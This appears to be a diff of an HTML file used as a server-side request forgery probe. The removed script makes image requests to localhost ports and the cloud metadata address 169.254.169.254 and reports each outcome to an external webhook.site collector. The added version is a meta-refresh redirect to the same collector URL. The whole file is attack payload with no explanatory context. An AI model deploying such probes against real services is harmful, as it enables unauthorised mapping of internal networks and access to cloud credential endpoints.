@@ -1,36 +1,11 @@
 <!DOCTYPE html>
 <html>
-<body>
-<script>
-const hook = "https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525";
-
-setTimeout(() => {
-  const targets = [
-    "http://127.0.0.1/",
-    "http://127.0.0.1:3000/",
-    "http://localhost/",
-    "http://localhost:8080/",
-    "http://169.254.169.254/latest/meta-data/"
-  ];
-
-  targets.forEach(url => {
-    try {
-      const img = new Image();
-      img.src = hook + "?ssrf_img_attempt=" + encodeURIComponent(url);
-      img.onerror = function () {
-        const test = new Image();
-        test.src = hook + "?ssrf_img_error=" + encodeURIComponent(url);
-      };
-      img.onload = function () {
-        const ok = new Image();
-        ok.src = hook + "?ssrf_img_success=" + encodeURIComponent(url);
-      };
-    } catch(e) {
-      const err = new Image();
-      err.src = hook + "?ssrf_img_exception=" + encodeURIComponent(url + " | " + e.message);
-    }
-  });
-}, 3000);
-</script>
-</body>
+  <head>
+    <meta http-equiv="refresh" content="0; url=https://webhook.site/e7e51d1c-b882-4d14-b4db-ba745f8a2525?via=redirect">
+    <title>Redirigiendo...</title>
+  </head>
+  <body>
+    Redirigiendo a destino externo...
+  </body>
 </html>
+
